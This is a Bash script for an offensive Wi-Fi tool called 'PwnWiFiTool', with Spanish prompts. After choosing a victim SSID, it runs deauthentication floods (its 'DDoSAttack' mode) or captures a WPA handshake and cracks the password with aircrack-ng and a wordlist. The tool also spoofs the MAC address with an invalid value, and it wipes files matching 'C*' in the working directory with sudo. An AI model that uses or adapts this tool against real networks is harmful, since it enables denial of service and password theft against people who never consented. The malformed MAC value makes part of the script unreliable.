#!/bin/bash

# PwnWiFiTool v1.0, Author @ch3fi (Jose María Becerra)

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function banner(){
        echo -e "\n${redColour}██████╗ ██╗    ██╗███╗   ██╗██╗    ██╗██╗███████╗██╗████████╗ ██████╗  ██████╗ ██╗     "
        sleep 0.05
        echo -e "██╔══██╗██║    ██║████╗  ██║██║    ██║██║██╔════╝██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     "
        sleep 0.05
        echo -e "██████╔╝██║ █╗ ██║██╔██╗ ██║██║ █╗ ██║██║█████╗  ██║   ██║   ██║   ██║██║   ██║██║     "
        sleep 0.05
        echo -e "██╔═══╝ ██║███╗██║██║╚██╗██║██║███╗██║██║██╔══╝  ██║   ██║   ██║   ██║██║   ██║██║     "
        sleep 0.05
        echo -e "██║     ╚███╔███╔╝██║ ╚████║╚███╔███╔╝██║██║     ██║   ██║   ╚██████╔╝╚██████╔╝███████╗"
        sleep 0.05
        echo -e "╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝ ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝${endColour}"
        sleep 0.05
	echo -e "\n${yellowColour}[*]${endColour} ${redColour}Herramienta desarrollada por @ch3fi ${endColour}"
}


function helpPanel(){
	banner
	echo -e "\n${grayColour}Uso:${endColour}"
	echo -e "\t${redColour}[-m]${endColour}${blueColour} Ataques: ${endColour}"
		echo -e "\t\t${purpleColour} -m DDoSAttack${endColour}"
		echo -e "\t\t${purpleColour} -m PasswordCracking${endColour}"
		echo -e "\t\t${purpleColour} -m Evil Twin Attack (Rogue AP)${endColour}"
	echo -e "\t${redColour}[-h]${endColour}${blueColour} Mostrar este panel de ayuda${endColour}\n"
	exit 1
}

### Función para escanear las dependencias.
function dependencies(){
	sleep 1.5; counter=0
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n"
	sleep 1

	dependencias=(php dnsmasq hostapd macchanger alacritty)

	for programa in "${dependencias[@]}"; do
		if [ "$(command -v $programa)" ]; then
			echo -e ". . .  ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} se encuentra instalada"
			let counter+=1
		else
			echo -e "${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} no se encuentra instalada"
		fi; sleep 0.4
	done

	if [ "$(echo $counter)" == "5" ]; then
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comenzando...\n"
		sleep 3
	else
		echo -e "\n${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script${endColour}\n"
		tput cnorm; exit
	fi
}

### Funcion para empezar el ataque
function startAttack(){
	if [[ -e ssid.txt ]]; then
		rm -rf ssid.txt
	fi

	#Borramos las capturas por si hay de airodump
	sudo rm -r C* 2>/dev/null

	#Comprobamos si el modo son los mismos que utilizamos
	if [ $mode = "DDoSAttack" ] || [ $mode = "PasswordCracking" ] || [ $mode = "EvilTwinAttack" ]  ; then
		echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1

		### Seleccionamos las intefaces que hay
		interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
		counter=1; for interface in $(cat iface); do
			echo -e "\t\n${blueColour}"["$counter"]."${endColour}${yellowColour} $interface ${endColour}"; sleep 0.26
			let counter++
		done;
		checker=0; while [ $checker -ne 1 ]; do
			echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface
	
			for interface in $(cat iface); do
				if [ "$choosed_interface" == "$interface" ]; then
					checker=1
				fi
			done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
		done
		
	
		## SELECCIONAR RED
		SSID=$(nmcli -t -f ALL dev wifi | cut -d":" -f2 | sed '/^ *$/d' | sort -u > ssid.txt)
		
		counter=1;
		while IFS= read -r line
		do echo -e "\n ${blueColour}"["$counter"]."${endColour} ${yellowColour}$line${endColour}"; sleep 0.26
		let counter++
		done < ssid.txt
		
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Elige el SSID de la victima (Ej: 1): ${endColour}" && read choosed_ssid
		ssid_selected=$(cat ssid.txt | head -n$choosed_ssid | tail -n1)
		echo -e "\t\n${yellowColour}[*]${endColour} ${blueColour}Has elegido el SSID ${endColour}${yellowColour}$ssid_selected${endColour}"
	
	
		## PREPARANDO LA TARJETA DE RED
		mon="mon"
		moninterface=$choosed_interface$mon
		echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Preparando la tarjeta de red $choosed_interface...${endColour}"; sleep 1
	
		channel_ssid=$(nmcli -t -f ALL dev wifi | grep $ssid_selected | cut -d":" -f11)
		
		#Activamos la tarjeta en modo monitor
			sudo airmon-ng start $choosed_interface > /dev/null 2>&1
		        sudo killall dhclient wpa_supplicant 2>/dev/null
		        sudo ifconfig $moninterface down
		        sudo macchanger --mac=00:20:91:FA:0D:P3 $moninterface > /dev/null 2>&1
		        sudo ifconfig $moninterface up
			killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
		
	
		if [ $mode = "DDoSAttack" ];then

			echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Iniciando el ataque de Denegacion de Servicio${endColour}"
	
			sudo iwconfig $moninterface channel $channel_ssid
		
			sudo alacritty -e sudo airodump-ng  -c $channel_ssid --essid $ssid_selected $moninterface &
			
			sleep 5
		
			sudo alacritty -e sudo aireplay-ng -0 0 -e $ssid_selected -c FF:FF:FF:FF:FF:FF $moninterface &

			echo -ne "\n${redColour}Cuando quieras parar el ataque pulsa${endColour}${yellowColour} CTRL + C ${endColour}"

			sleep 300000000000000

		elif [ $mode = "PasswordCracking" ];then
			diccionary=""
			
			echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Introduzca la ruta del diccionario que quieras usar: (Por Defecto: PwnWordlist.txt)${endColour}" && read diccionary
			
			if [ "$diccionary" = "" ];then
				echo -e "\n${redColour}[!] No has elegido ningun diccionario.....${endColour}"
				echo -e "\n${yellowColour}[?]${endColour}${grayColour} Se utilizará ${endColour}${yellowColour}PwnWordlist.txt${endColour}"
				diccionary=PwnWordlist.txt
			else
				echo -e "\n${yellowColour}[*]${endColour}${blueColour} Has elegido ${endColour}${yellowColour}$diccionary ${endColour}"
			fi

			sudo alacritty -e sudo airodump-ng -w Captura -c $channel_ssid --essid $ssid_selected $moninterface &
			airodump_PID=$!
			
			sleep 5;sudo alacritty -e sudo aireplay-ng -0 20 -e $ssid_selected -c FF:FF:FF:FF:FF:FF $moninterface &
			aireplay_PID=$!

			sleep 10
			
			if aircrack-ng Captura-01.cap | grep -q "1 handshake"; then
				killall aireplay-ng 2>/dev/null
				killall airodump-ng 2>/dev/null
				echo -e "\n${yellowColour}[*] ${endColour}${blueColour}HandShake encontrado. Aplicando fuerza bruta con ${endColour}${yellowColour}$diccionary${endColour}"
				sleep 1;sudo alacritty -e aircrack-ng -w $diccionary Captura-01.cap -l /tmp/PwnWiFiTool-$ssid_selected-pass.txt 

				if [ -f /tmp/PwnWiFiTool-$ssid_selected-pass.txt ]; then
					echo -e "\n${greenColour}[V]${endColour}${grayColour} La contraseña se ha guardado en ${endColour}${yellowColour}/tmp/PwnWiFiTool-$ssid_selected-pass.txt${endColour}"
				else
					echo -e "\n${redColour}[X] La contraseña no se ha encontrado. Prueba con otro diccionario${endColour}"
				fi
				salida
			else
				echo -e "\n${redColour}[!] No se ha obtenido el handshake... Ejecuta de nuevo el programa${endColour}"
				killall airodump-ng 2>/dev/null
				salida
				exit 1
			fi
			
		elif [ $mode = "EvilTwinAttack" ]; then
			echo 
		else
			echo
		fi	
	else
		echo -e "${redColour}[!] Opcion Incorrecta${endColour}"
	fi
}

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
        sudo ifconfig wlo1mon down
        sudo macchanger -p wlo1mon > /dev/null 2>&1
        sudo ifconfig wlo1mon up
        sudo airmon-ng stop wlo1mon > /dev/null 2>&1
        sudo systemctl start NetworkManager
	rm -r iface ssid.txt 2>/dev/null
	rm -r C* 2>/dev/null
	exit 0
}

function salida(){
	sudo ifconfig wlo1mon down
        sudo macchanger -p wlo1mon > /dev/null 2>&1
        sudo ifconfig wlo1mon up
        sudo airmon-ng stop wlo1mon > /dev/null 2>&1
        sudo systemctl start NetworkManager
        rm -r iface ssid.txt 2>/dev/null
        rm -r C* 2>/dev/null
	rm -r /tmp/$ssid_selected-password.txt 2>/dev/null
        exit 0
}


# Main Program
if [ "$(id -u)" == "0" ]; then
	declare -i parameter_enable=0; while getopts ":m:h:" arg; do
		case $arg in
		m) mode=$OPTARG && let parameter_enable+=1;;
		h) helpPanel;;
		esac
	done

	if [ $parameter_enable -ne 1 ]; then
		clear
		helpPanel
	else
		clear
		banner
		dependencies
		startAttack
		salida		
	fi
else
	echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
	exit 1
fi
